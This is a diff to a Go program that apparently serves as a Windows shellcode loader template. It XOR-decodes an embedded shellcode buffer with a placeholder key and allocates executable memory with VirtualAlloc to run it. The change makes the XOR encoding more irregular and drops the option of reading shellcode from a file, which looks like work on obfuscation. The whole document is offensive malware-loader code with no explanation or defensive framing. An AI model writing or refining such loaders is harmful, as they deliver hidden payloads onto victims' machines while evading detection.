@@ -1,7 +1,6 @@
 package main
 
 import (
-	"io/ioutil"
 	"os"
 	"syscall"
 	"unsafe"
@@ -25,7 +24,11 @@ var (
 
 func xor(buf []byte, key string) []byte {
 	for i := 0; i < len(buf); i++ {
-		buf[i] ^= key[i%len(key)]
+		if i%2 == 0 {
+			buf[i] ^= key[i%len(key)]
+		} else {
+			buf[i] ^= key[(i+1)%len(key)]
+		}
 	}
 	return buf
 }
@@ -41,11 +44,6 @@ func checkErr(err error) {
 
 func main() {
 	shellcode := xor(shellcode_buf, "$key")
-	if len(os.Args) > 1 {
-		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
-		checkErr(err)
-		shellcode = shellcodeFileData
-	}
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
